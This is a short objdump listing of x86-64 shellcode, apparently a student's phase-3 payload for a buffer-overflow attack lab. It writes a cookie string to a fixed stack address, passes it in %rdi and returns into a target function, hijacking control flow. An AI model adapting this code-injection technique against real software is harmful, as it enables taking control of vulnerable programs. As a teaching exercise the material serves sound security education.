
phase3.code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   7:	37 66 61 
   a:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
  11:	48 89 07             	mov    %rax,(%rdi)
  14:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%rdi)
  1b:	68 fa 18 40 00       	push   $0x4018fa
  20:	c3                   	ret
